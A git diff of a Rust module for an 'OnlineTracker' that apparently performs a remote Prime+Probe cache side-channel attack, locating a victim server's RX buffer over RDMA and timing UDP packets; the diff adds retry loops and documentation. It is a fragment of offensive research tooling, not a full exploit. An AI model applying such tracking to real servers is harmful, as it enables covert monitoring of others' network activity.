@@ -5,19 +5,18 @@
 mod pattern;
 mod tracking;
 
-use crate::connection::rdma;
-use crate::rpp::{ColorCode, ColoredSetCode, Rpp, SetCode};
+use crate::connection::MemoryConnector;
+use crate::rpp::{ColorCode, ColoredSetCode, Contents, Rpp, SetCode};
 use pattern::{Pattern, PatternIdx};
 use std::collections::HashMap;
 use std::io::Result;
-use std::io::Write;
 use std::io::{Error, ErrorKind};
 use std::net::{ToSocketAddrs, UdpSocket};
 use std::time::Instant;
 use tracking::{SyncStatus, TrackingContext};
-use serde_json::to_string;
 
 type SavedLats = Vec<(Vec<Option<SetCode>>, SyncStatus, u128)>;
+type PossiblePatterns = HashMap<ColorCode, Vec<Option<ColoredSetCode>>>;
 
 const REPEATINGS: usize = 8;
 const MEASUREMENT_CNT: usize = 10000;
@@ -34,8 +33,10 @@ impl OnlineTracker {
     /// Creates a new online tracker. `addr` is the victim-server address.
     /// Fails if port 9009 is used on the attacker machine or if the given
     /// address is unapropriet for connecting to.  
-    pub fn new<A: ToSocketAddrs + Clone>(addr: A) -> Result<OnlineTracker> {
-        let conn = Box::new(rdma::RdmaServerConnector::new(addr.clone()));
+    pub fn new<A: ToSocketAddrs + Clone>(
+        addr: A,
+        conn: Box<dyn MemoryConnector<Item = Contents>>,
+    ) -> Result<OnlineTracker> {
         let rpp = Rpp::new(conn);
         let sock = UdpSocket::bind("127.0.0.1:9009")?;
         sock.connect(addr)?;
@@ -49,20 +50,56 @@ impl OnlineTracker {
         })
     }
 
-    // TODO: document and fill
+    /// Starts online tracking phase.
+    ///
+    /// # Fails
+    ///
+    /// Fails if:
+    ///
+    /// - Priming or probing of sets for a given
+    /// - UDP connection for a provided at creation adress fails (cannot send packets)
+    /// - No pattern in cache could be found even after retries
+    /// - Cannot find the initial possition in RX buffer of the victim server
+    ///
+    // UGLY maybe there is some other way to handle retries?
     pub fn track(&mut self) -> Result<()> {
-        self.locate_rx()?;
+        let mut err_cnt = 0;
+        while let Err(e) = self.locate_rx() {
+            err_cnt += 1;
+            if err_cnt > MAX_FAIL_CNT {
+                return Err(e);
+            }
+        }
+
+        err_cnt = 0;
+        while let Err(e) = self.measure() {
+            err_cnt += 1;
+
+            if err_cnt > MAX_FAIL_CNT {
+                return Err(e);
+            }
+        }
+
         Ok(())
     }
 
     /// Locates the RX buffer in the cache. The buffer is expected to reside
     /// on a single page and be a single for the os (sometimes there might be
-    /// multiple RX buffers)
+    /// multiple RX buffers). Repeats the process if the pattern is indistinctive.
+    ///
     /// # Fails
+    ///
     /// Fails if Prime or Probe fails, if there are issues with sending UDP
     /// packets to the target, and if the pattern cannot be found in the set
     /// of data.
     fn locate_rx(&mut self) -> Result<()> {
+        let patterns = self.locate_rx_round()?;
+        self.pattern = Self::find_pattern(patterns)?;
+
+        Ok(())
+    }
+
+    fn locate_rx_round(&mut self) -> Result<PossiblePatterns> {
         let mut patterns = HashMap::with_capacity(self.rpp.colors_len());
         let color_codes = self.rpp.colors().collect::<Vec<ColorCode>>();
 
@@ -87,9 +124,7 @@ impl OnlineTracker {
             patterns.insert(color_code, pattern);
         }
 
-        self.pattern = Self::find_pattern(patterns)?;
-
-        Ok(())
+        Ok(patterns)
     }
 
     fn get_init_pos(&mut self) -> Result<PatternIdx> {
@@ -125,7 +160,7 @@ impl OnlineTracker {
         Ok(())
     }
 
-    fn find_pattern(patterns: HashMap<ColorCode, Vec<Option<ColoredSetCode>>>) -> Result<Pattern> {
+    fn find_pattern(patterns: PossiblePatterns) -> Result<Pattern> {
         let mut fnd_pts = HashMap::with_capacity(1);
 
         for (color_code, pattern) in patterns {
@@ -142,6 +177,7 @@ impl OnlineTracker {
         // For now, we expect only one pattern to arise. If not, then other methods should be used
         // NOTE one may add confidence level for each pattern, based on the statistics for each entry in
         // a pattern
+        // UGLY should have a separete error type
         if fnd_pts.len() != 1 {
             return Err(Error::new(
                 ErrorKind::Other,
@@ -232,7 +268,7 @@ impl OnlineTracker {
     }
 
     #[inline(always)]
-    // TODO maybe we do not need to store all the information
+    // NOTE maybe we do not need to store all the information
     fn save(&mut self, probes: Vec<Option<SetCode>>, stat: SyncStatus, timestamp: u128) {
         self.latencies.push((probes, stat, timestamp))
     }
